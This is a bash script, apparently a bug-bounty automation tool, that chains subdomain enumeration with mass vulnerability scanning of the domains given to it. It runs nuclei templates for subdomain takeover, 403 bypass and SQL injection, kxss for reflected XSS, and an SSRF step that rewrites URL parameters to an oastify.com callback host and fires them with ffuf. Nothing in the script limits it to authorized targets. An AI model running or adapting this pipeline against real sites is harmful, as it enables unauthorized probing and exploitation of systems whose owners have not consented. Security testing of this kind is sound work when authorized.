#!/bin/bash
NC='\033[0m'
RED='\033[1;38;5;196m'
GREEN='\033[1;38;5;040m'
ORANGE='\033[1;38;5;202m'
BLUE='\033[1;38;5;012m'
BLUE2='\033[1;38;5;032m'
PINK='\033[1;38;5;013m'
GRAY='\033[1;38;5;004m'
NEW='\033[1;38;5;154m'
YELLOW='\033[1;38;5;214m'
CG='\033[1;38;5;087m'
CP='\033[1;38;5;221m'
CPO='\033[1;38;5;205m'
CN='\033[1;38;5;247m'
CNC='\033[1;38;5;051m'


echo -e ${RED}"##################################################################"
echo -e ${CP}"                                                                 #"                                                  
echo -e ${CP}"       ██╗██████╗░██████╗░░█████╗░██╗░░██╗██╗███╗░░░███╗         #"
echo -e ${CP}"       ██║██╔══██╗██╔══██╗██╔══██╗██║░░██║██║████╗░████║         #"
echo -e ${CP}"       ██║██████╦╝██████╔╝███████║███████║██║██╔████╔██║         #"
echo -e ${CP}"       ██║██╔══██╗██╔══██╗██╔══██║██╔══██║██║██║╚██╔╝██║         #"
echo -e ${CP}"       ██║██████╦╝██║░░██║██║░░██║██║░░██║██║██║░╚═╝░██║         #"
echo -e ${CP}"       ╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░░░░╚═╝         #"
echo -e ${CP}"         Automate SUBOMAIN ENUM XSS SQLI SSRF SSTI SUBTAKEOVER   #"                                           
echo -e ${BLUE}"           https://facebook.com/ibraheem_haxor                   #"  
echo -e ${YELLOW}"              Coded By: ibrahim Haxor                            #"
echo -e ${CG}"              https://github.com/ibrahimhaxor                    #"
echo -e ${RED}"################################################################## \n "




echo -e ${YELLOW}" CHECKING FOR SUDOMAIN ENEUMERATION"

host=$1
wordlist="/home/ibrahim/wordlist/all.txt"
resolver="/home/ibrahim/resolvers.txt"

domain_enum(){
for domain in $(cat $host);
do


subfinder -d $domain >> /home/ibrahim/Arecon/all.txt
assetfinder -subs-only $domain >> /home/ibrahim/Arecon/all.txt
findomain -t $domain >> /home/ibrahim/Arecon/all.txt
amass enum -active -d $domain >> /home/ibrahim/Arecon/all.txt
curl -s "https://crt.sh/?q=%25.$domain&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u >> /home/ibrahim/Arecon/all.txt
curl -s "https://riddler.io/search/exportcsv?q=pld:$domain" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u >> /home/ibrahim/Arecon/all.txt
curl -s https://dns.bufferover.run/dns?q=.$domain |jq -r .FDNS_A[]|cut -d',' -f2|sort -u >> /home/ibrahim/Arecon/all.txt
curl -s "https://jldc.me/anubis/subdomains/$domain" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u >> /home/ibrahim/Arecon/all.txt

cat /home/ibrahim/Arecon/all.txt >> /home/ibrahim/Arecon/allsub.txt
cat /home/ibrahim/Arecon/allsub.txt  sort -u | tee -a /home/ibrahim/Arecon/allsubsort.txt
done
}
domain_enum


cat /home/ibrahim/Arecon/allsubsort.txt | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u >> /home/ibrahim/Arecon/allsufinal.txt

echo -e ${YELLOW}" CHECKING FOR DNS DANGLING + SUBDOMAIN TAKEOVER"

cat /home/ibrahim/Arecon/allsufinal.txt | nuclei -t /home/ibrahim/Desktop/Recon-villages/PENTEST-TIGER/ibrahim-templates/dns-danglin/

echo -e ${YELLOW}" CHECKING FOR LIVE SUDOMAIN HTTPROBE"

cat /home/ibrahim/Arecon/allsufinal.txt | httprobe | tee -a /home/ibrahim/Arecon/allsublive.txt

echo -e ${YELLOW}" CHECKING FOR SUDOMAIN 200 OK"

cat /home/ibrahim/Arecon/allsublive.txt | nuclei -t /home/ibrahim/Desktop/Recon-villages/PENTEST-TIGER/200finder.yaml -o /home/ibrahim/Arecon/sub200.txt

cat /home/ibrahim/Arecon/sub200.txt | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew >> /home/ibrahim/Arecon/sub200.txt

echo -e ${YELLOW}" CHECKING FOR SUDOMAIN 403 FINDER"

cat /home/ibrahim/Arecon/allsublive.txt | nuclei -t /home/ibrahim/Desktop/Recon-villages/PENTEST-TIGER/403finder.yaml -o /home/ibrahim/Arecon/sub403.txt

cat /home/ibrahim/Arecon/sub403.txt | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew >> /home/ibrahim/Arecon/sub4033.txt

echo -e ${YELLOW}" CHECKING FOR SUDOMAIN 403 BYPASS"

cat /home/ibrahim/Arecon/sub4033.txt | nuclei -t /home/ibrahim/Desktop/Recon-villages/PENTEST-TIGER/ibrahim-templates/403/ -o /home/ibrahim/Arecon/byp403.txt

echo -e ${YELLOW}"STARTING NUCLEI ALL"

cat /home/ibrahim/Arecon/allsufinal.txt | nuclei -t /home/ibrahim/Desktop/Recon-villages/PENTEST-TIGER/ibrahim-templates/ -o /home/ibrahim/Arecon/nucleiall.txt

echo -e ${YELLOW}"STARTING PARAMSPIDER"

for i in `cat /home/ibrahim/Arecon/sub200.txt`; do

python3 ParamSpider/paramspider.py -d $i --exclude woff,css,js,png,svg,jpg

done;


cat /home/ibrahim/output/https:/*.txt >> /home/ibrahim/Arecon/sub2.txt

cat /home/ibrahim/output/http:/*.txt >> /home/ibrahim/Arecon/sub2.txt

cat /home/ibrahim/Arecon/sub2.txt | sed 's/FUZZ/ /g' >> /home/ibrahim/Arecon/sub3.txt
echo -e ${YELLOW}" CHECKING FOR REPLECTED XSS"
cat /home/ibrahim/Arecon/sub3.txt | kxss >> /home/ibrahim/Arecon/subkxss.txt
echo -e ${RED}" CHECKING FOR SQL INJECTION"
cat /home/ibrahim/Arecon/sub3.txt | nuclei -t /home/ibrahim/Desktop/Recon-villages/PENTEST-TIGER/ibrahim-templates/sqli/ -o /home/ibrahim/Arecon/subnuclei.txt
echo -e ${YELLOW}" CHECKING FOR SSRF"
cat /home/ibrahim/Arecon/sub3.txt | gf ssrf | grep "=" | qsreplace http://9hr13l3eymsedybskej4w0vb62cu0loa.oastify.com >> /home/ibrahim/Arecon/subssrf.txt
ffuf -u "FUZZ" -w /home/ibrahim/Arecon/subssrf.txt -mc 200
